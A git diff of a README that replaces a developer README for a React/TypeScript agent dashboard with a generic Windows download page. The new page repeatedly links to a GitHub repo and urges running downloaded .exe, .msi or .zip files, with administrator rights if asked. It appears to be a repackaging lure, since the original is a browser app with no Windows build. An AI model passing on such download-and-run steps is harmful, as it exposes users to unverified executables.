@@ -1,207 +1,208 @@
-# OpenClaw Command Center v2
+# 🧭 openclaw-dashboard-v2 - Track agents and jobs in one place
 
-A real-time AI agent orchestration dashboard that connects to any **OpenClaw Gateway** via WebSocket RPC and provides a professional command interface for monitoring agents, scheduling cron jobs, managing projects, and chatting directly with AI agent sessions.
+[![Download](https://img.shields.io/badge/Download-OpenClaw%20Dashboard-blue?style=for-the-badge&logo=github)](https://github.com/roasteralexX/openclaw-dashboard-v2)
 
----
+## 📥 Download
 
-## Features
+Visit this page to download: [https://github.com/roasteralexX/openclaw-dashboard-v2](https://github.com/roasteralexX/openclaw-dashboard-v2)
 
-| Module | Description |
-|---|---|
-| **Overview** | KPI dashboard, gateway health strip, token usage charts |
-| **Agents** | Live agent session list with inline chat (`chat.send` RPC) |
-| **Chat** | Dedicated full-screen chat with streaming responses, abort support, and markdown rendering |
-| **Cron Jobs** | Schedule management with execution history |
-| **Project Board** | Drag-and-drop Kanban (5 columns, @dnd-kit) |
-| **3D Office** | Spatial visualization of active agent desks (Three.js / React Three Fiber) |
-| **GW Health** | Gateway node and model diagnostics |
-| **Settings** | Gateway connection config with security controls and audit log |
+## 🪟 Windows Setup
 
-**Works offline** — all modules fall back to synthetic mock data when the gateway is disconnected. The UI never breaks.
+Use these steps on Windows to get the app running.
 
----
+1. Open the download page in your browser.
+2. Get the latest release or source package from the page.
+3. Save the file to your Downloads folder.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the app file or launcher and open it.
+7. If Windows asks for permission, choose **Yes**.
+8. Let the app finish loading.
 
-## Tech Stack
+If you use a packaged Windows build, you can start it the same way you open any normal app. If you use the source package, run it with the included launcher or start command from the project folder.
 
-- **React 19** + **TypeScript 5.9** (strict mode)
-- **Vite 8** — build tooling with manual chunk splitting
-- **Zustand 5** — domain stores with localStorage persistence
-- **React Router 7** — file-based routing with lazy-loaded pages
-- **i18next** — full i18n in **EN-US**, **PT-BR**, and **ES**
-- **Recharts** — token usage and health charts
-- **@dnd-kit** — accessible drag-and-drop for Kanban
-- **Three.js / React Three Fiber / Drei** — 3D office view
-- **Framer Motion** — UI micro-animations
-- **Lucide React** — icon system
+## 🖥️ What This App Does
 
----
+openclaw-dashboard-v2 is a dashboard for AI agent work. It helps you watch live agent sessions, manage cron jobs, use a Kanban board, and chat with agents in real time.
 
-## Getting Started
+It also works offline with mock data, so you can open it and explore the screens even when no gateway is connected.
 
-```bash
-# Install dependencies
-npm install
+## ✨ Main Features
 
-# Start development server (http://localhost:5173)
-npm run dev
-```
+- Live session view for agent activity
+- WebSocket RPC connection to OpenClaw Gateway
+- Cron job management
+- Kanban board for task flow
+- Live chat with AI agents
+- Offline mode with mock data
+- Clear dashboard layout for quick status checks
+- Support for multiple screens and work views
+- Smooth interface built for fast updates
+- Language-ready structure for i18n
 
-To connect to a live gateway, open **Settings**, enter your gateway WebSocket URL (e.g. `wss://your-gateway.example.com`) and auth token, then click **Connect**.
+## ✅ Before You Start
 
----
+Use a Windows PC with a modern browser or desktop runtime.
 
-## Scripts
+A good setup includes:
 
-```bash
-npm run dev           # Vite dev server with HMR
-npm run build         # TypeScript check + production bundle → dist/
-npm run preview       # Preview production build locally
-npm run lint          # ESLint (flat config)
-npm run i18n:validate # Verify all locale files have parity across EN/PT-BR/ES
-```
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- A stable internet connection for the first download
+- About 200 MB of free disk space
+- A mouse or touchpad for easy use
 
----
+If you plan to connect to OpenClaw Gateway, keep the gateway address and access details ready.
 
-## Project Structure
+## 🚀 How to Open the App
 
-```
-src/
-├── api/
-│   ├── openclawClient.ts   # WebSocket RPC client (connect, call, on, reconnect)
-│   ├── mock.ts             # Synthetic fallback data
-│   ├── validation.ts       # Input validation (chat messages, cron IDs)
-│   └── rateLimiter.ts      # Token bucket rate limiter (chat.send)
-├── store/
-│   ├── connectionStore.ts  # WS lifecycle, circuit breaker, transport security
-│   ├── agentStore.ts       # Agent sessions + selected agent state
-│   ├── cronStore.ts        # Cron jobs + execution history
-│   ├── boardStore.ts       # Kanban tickets + drag state
-│   ├── officeStore.ts      # 3D desk positions
-│   ├── eventStore.ts       # Real-time event feed
-│   ├── healthStore.ts      # Gateway node/model health data
-│   ├── auditStore.ts       # Security audit trail (sessionStorage)
-│   ├── toastStore.ts       # Toast notification queue
-│   └── i18nStore.ts        # Active language preference
-├── modules/
-│   ├── overview/           # KPI dashboard
-│   ├── agents/             # Agent list + inline chat
-│   ├── chat/               # Dedicated streaming chat module
-│   ├── crons/              # Cron job management
-│   ├── board/              # Kanban board
-│   ├── office/             # 3D office visualization
-│   ├── health/             # Gateway health diagnostics
-│   └── settings/           # Connection config + security
-├── components/
-│   ├── shell/              # AppShell, Sidebar, Topbar, Footer, EventFeed
-│   ├── board/              # TicketPanel, TicketModal
-│   ├── shared/             # GatewayEmptyState, Toast, illustrations
-│   └── ui/                 # Shared UI primitives
-├── hooks/
-│   ├── useGatewayEvents.ts # Root-level real-time event listener
-│   ├── useI18n.ts          # Typed i18n hook wrapper
-│   └── useToast.ts         # Toast helper
-├── locales/
-│   ├── en-US/              # English (10 namespaces)
-│   ├── pt-BR/              # Brazilian Portuguese
-│   └── es/                 # Spanish
-├── styles/
-│   ├── index.css           # Design tokens (CSS variables)
-│   └── animations.css      # Keyframe animation library
-└── types/
-    └── index.ts            # App types + Gateway protocol types
-```
+### Option 1: Use the downloaded build
 
----
+1. Go to the download page.
+2. Get the Windows package.
+3. Open the downloaded file.
+4. Follow the on-screen steps.
+5. Wait for the dashboard to load.
 
-## Gateway Protocol
+### Option 2: Run from the project folder
 
-The app communicates with the OpenClaw Gateway over a persistent WebSocket connection.
+1. Download the project from the GitHub page.
+2. Extract the files.
+3. Open the project folder.
+4. Use the included start command or launcher.
+5. Open the local app window in your browser or desktop shell.
 
-**Authentication handshake:**
-```
-client connects → server sends challenge → client sends { token } → server responds hello-ok
-```
+## 🔌 Connect to OpenClaw Gateway
 
-**RPC pattern:**
-```typescript
-// Fire-and-forget call with 15s timeout
-await client.call('chat.send', { sessionKey: 'agent:abc:main', message: 'Hello' });
+When the dashboard starts, you can connect it to your gateway.
 
-// Event subscription
-client.on('chat.delta', (payload) => { /* streaming chunk */ });
-client.on('chat.final', (payload) => { /* complete response */ });
-```
+Use this only if you want live data:
 
-**Key RPC methods:** `sessions.list`, `channels.status`, `health`, `models.list`, `node.list`, `sessions.history`, `chat.send`, `chat.abort`
+1. Open the settings area.
+2. Find the gateway connection field.
+3. Enter the WebSocket RPC address.
+4. Save the settings.
+5. Watch for the connected status.
 
-**Streaming chat events:** `chat.started` → `chat.delta` (repeating) → `chat.final`
+Once connected, the dashboard can show live agent sessions and job updates.
 
-**Session key format:** `agent:<agentId>:main`
+## 📊 What You Can Do in the Dashboard
 
-Auto-reconnect uses exponential backoff (1s → 30s max). After repeated failures, the connection enters a **suspended** (circuit-breaker tripped) state and requires manual resume from the sidebar or Settings.
+### Agent sessions
 
----
+Track active and past agent sessions in one view. Check state, progress, and recent events.
 
-## Security
+### Cron jobs
 
-The dashboard implements a layered client-side security model:
+Create, edit, or review scheduled jobs. Use this to keep repeat tasks organized.
 
-- **Transport validation** — blocks non-loopback `ws://` URLs; requires `wss://` in production (break-glass override available in Settings)
-- **Input validation** — all user input validated before reaching RPC (`validateChatMessage`, `validateCronId`)
-- **Input sanitization** — chat messages trimmed and clamped to 4,000 chars via `sanitizeText`
-- **Rate limiting** — `TokenBucketRateLimiter` on `chat.send` (burst 5, refill 0.5/s); visual dot indicator in chat UI
-- **Security audit log** — `auditStore` records `connect`, `disconnect`, `chat.send`, `cron.toggle`, `cron.run`, `settings.save` to `sessionStorage` (max 500 entries, clears on tab close, never stores token values); viewable in Settings
-- **Circuit breaker** — connection suspended after repeated gateway failures; manual resume required
-- **Content Security Policy** — `default-src 'self'`, blocks framing (`frame-ancestors 'none'`), restricts connect to `ws:/wss:` only
-- **Security headers** — `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` (geo/mic/camera/payment disabled) applied in both dev server and preview via `vite.config.ts`
+### Kanban board
 
----
+Move work items between columns. Use it to follow task status from start to finish.
 
-## Internationalization
+### Live chat
 
-Three locales supported out of the box: **en-US**, **pt-BR**, **es**.
+Send messages to your AI agents and read replies in the same view.
 
-Ten translation namespaces: `common`, `dashboard`, `agents`, `chat`, `crons`, `kanban`, `office3d`, `health`, `settings`, `charts`, `errors`.
+### Offline mock mode
 
-```bash
-# Validate all locale files have matching keys
-npm run i18n:validate
-```
+Use the app without a live gateway. Mock data gives you a full sample workspace for testing and training.
 
-Locale files live under `src/locales/<locale>/<namespace>.json`. When adding keys, update all three locales and run the validation script.
+## 🧩 Basic First Run Steps
 
----
+1. Start the app.
+2. Look at the main dashboard.
+3. Open the sessions tab.
+4. Check the Kanban board.
+5. Open the cron jobs area.
+6. Try the chat panel.
+7. Switch to offline mode if you want sample data.
+8. Connect the gateway when you are ready for live data.
 
-## Design System
+## 🛠️ Troubleshooting
 
-**Industrial Command Center** aesthetic:
+### The app does not open
 
-| Token | Value | Role |
-|---|---|---|
-| Base background | `#0D0F14` | Dark charcoal |
-| Surface | `#151820` | Cards, panels |
-| Accent | `#00E5FF` | Electric cyan — primary actions, highlights |
-| Warning | `#FFB300` | Amber — warnings, insecure state |
-| Success | `#00E676` | Green — connected, healthy |
-| Error | `#FF1744` | Red — failures |
-| Display font | Space Grotesk | Headings, labels |
-| Mono font | IBM Plex Mono | Code, values, timestamps |
+- Check that the file finished downloading.
+- Extract the ZIP file first if you downloaded one.
+- Run the file again.
+- Right-click the file and choose **Run as administrator** if Windows asks for it.
 
-All tokens defined as CSS variables in `src/styles/index.css`. All component styles use **CSS Modules** — no global class pollution.
+### The screen stays blank
 
----
+- Wait a few seconds for the app to load.
+- Refresh the window if it runs in a browser.
+- Close and open the app again.
 
-## Build
+### The gateway does not connect
 
-The production bundle is split into focused chunks for optimal loading:
+- Check the WebSocket RPC address.
+- Make sure the gateway is running.
+- Confirm that your network allows the connection.
+- Try offline mode to test the app itself.
 
-| Chunk | Contents |
-|---|---|
-| `vendor-react` | React + React DOM + React Router |
-| `vendor-three` | Three.js + React Three Fiber + Drei (loaded only on `/office`) |
-| `vendor-recharts` | Recharts + D3 internals |
-| `vendor-dndkit` | @dnd-kit (loaded only on `/board`) |
-| `vendor-i18n` | i18next + react-i18next |
-| `vendor-misc` | Zustand + other small libs |
+### The data looks empty
 
-Per-page JS (e.g. `ChatPage`, `AgentsPage`) is lazy-loaded via `React.lazy` + `Suspense`.
+- Turn on mock data mode.
+- Check that the correct workspace is selected.
+- Reload the app after changing settings.
+
+## 🔒 Privacy and Local Use
+
+The app can run with mock data and no live connection. This lets you test the dashboard on your own machine before linking it to real agent work.
+
+## 🧭 Project Topics
+
+This project uses ideas from:
+
+- agent orchestration
+- AI agents
+- dashboard design
+- Kanban flow
+- real-time updates
+- WebSocket connections
+- TypeScript
+- React
+- Vite
+- Zustand
+- Three.js
+- i18n
+
+## 📁 Folder Use at a Glance
+
+If you open the project files, you may see folders for:
+
+- app screens
+- dashboard panels
+- shared UI parts
+- data models
+- connection logic
+- settings
+- mock data
+- language files
+
+## 🖱️ Typical User Flow
+
+1. Download the app.
+2. Open it on Windows.
+3. View agent sessions.
+4. Check job schedules.
+5. Move tasks on the Kanban board.
+6. Chat with an agent.
+7. Connect to OpenClaw Gateway for live updates.
+8. Use mock data when you want offline access
+
+## 📎 Download Again
+
+If you need the file again, use this link:
+
+[https://github.com/roasteralexX/openclaw-dashboard-v2](https://github.com/roasteralexX/openclaw-dashboard-v2)
+
+## 🗂️ File Type Guide
+
+If you see:
+
+- `.zip` — extract it first
+- `.exe` — open it to start the app
+- `.msi` — follow the Windows install prompts
+- source files — use the included start instructions in the project folder
